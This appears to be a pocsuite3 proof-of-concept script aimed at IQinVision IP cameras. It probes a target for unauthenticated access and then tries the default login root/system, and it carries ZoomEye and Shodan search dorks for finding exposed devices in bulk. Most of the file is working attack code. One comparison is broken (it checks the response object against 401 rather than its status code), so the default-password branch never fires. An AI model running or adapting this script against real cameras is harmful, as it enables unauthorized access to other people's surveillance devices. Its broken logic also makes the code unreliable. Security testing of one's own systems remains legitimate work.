#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    POCBase, register_poc, requests, logger,
    OptString,
    random_str,
)
import base64

from threading import Thread

class DemoPOC(POCBase):
    vulID = 'xxxxx'
    version = 'xxxxxx'
    author = 'xxxxx'
    vulDate = '2023-03-13'
    createDate = '2023-03-13'
    updateDate = '2023-03-13'
    references = []
    name = 'IQinVision 默认密码'
    appPowerLink = 'xxxxx'
    appName = 'IQinVision'
    appVersion = 'xxxxx'
    vulType = 'Login Bypass'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': 'app:"IQinVision"',
            'shodan':'IQinVision'}
    suricata_request = ''
    suricata_response = ''


    def _verify(self):
        #dork = "app:'IQinVision' +title:"Error: Unauthorized" +app:"IQinVision embedded httpd""

        creds = {'username':'root','password':'system'}
        login_encode = str.encode(creds["username"] + ":" + creds['password'])
        login_encode64 = str(base64.b64encode(login_encode), 'utf-8')

        payload = {"Authorization": 'Basic ' + login_encode64,
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                   "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                   }
        res1 = requests.get(self.url)
        #未授权访问
        if res1.status_code == 200 and res1.headers['Server'] == 'IQinVision Embedded 1.0':
            result = {}
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            return self.parse_output(result)
        elif res1 == 401 and 'Please Authenticate' in res1.text:
            #弱口令
            res2 = requests.post(self.url, headers=payload)
            if res2.status_code != 401 and 'appletvid.html' in res2.text:

                result = {}
                result['VerifyInfo'] = {}
                result['VerifyInfo']['login'] = creds
                result['VerifyInfo']['URL'] = self.url
                return self.parse_output(result)


    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
